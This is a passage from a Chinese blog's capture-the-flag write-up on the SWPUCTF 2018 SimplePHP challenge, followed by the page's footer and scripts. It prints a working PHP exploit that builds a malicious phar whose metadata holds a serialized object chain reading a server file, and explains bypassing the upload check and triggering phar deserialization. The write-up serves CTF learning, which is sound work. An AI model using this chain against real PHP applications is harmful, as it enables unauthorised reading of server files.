<p>==&gt;Test: 执行 __get($key)。$key为source。 <code>get($key) $value=this-&gt;params['source']; file_get_contents($value); </code>params是数组，故就定义<code>params=array('source'=&gt;'/var/www/html/fl1g.php');</code></p>
<p>exp</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $test;
    <span class="hljs-keyword">public</span> $str;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $source;
    <span class="hljs-keyword">public</span> $str;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $file;
    <span class="hljs-keyword">public</span> $params;

&#125;

$c1e4r = <span class="hljs-keyword">new</span> C1e4r();
$show = <span class="hljs-keyword">new</span> Show();
$test = <span class="hljs-keyword">new</span> Test();
$test-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>] = <span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;
$c1e4r-&gt;str = $show;   
$show-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = $test; 


$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp.phar&quot;</span>); 
$phar-&gt;startBuffering();
$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的</span>
$phar-&gt;setMetadata($c1e4r); <span class="hljs-comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>
$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); 
$phar-&gt;stopBuffering();

<span class="hljs-meta">?&gt;</span></code></pre>
<p>生成文件后上传，因为<code>upload_file_check()</code>的限制需要改后缀名，文件名为MD5（文件名+IP）算出，在file下触发phar即可</p>
<p><img src="/2021/07/30/black/7.png" srcset="/img/loading.gif" alt="7"></p>
<p>解码获得flag</p>
<p>参考：<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/">https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Flask-session%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0/">Flask-session身份伪造</a>
                    
                      <a class="hover-with-bg" href="/categories/Flask-session%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">phar反序列化</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/reverse-shell/">reverse shell</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/01/regexp/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">REGEXP注入与LIKE注入</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/07/29/session/">
                        <span class="hidden-mobile">buu（三）</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
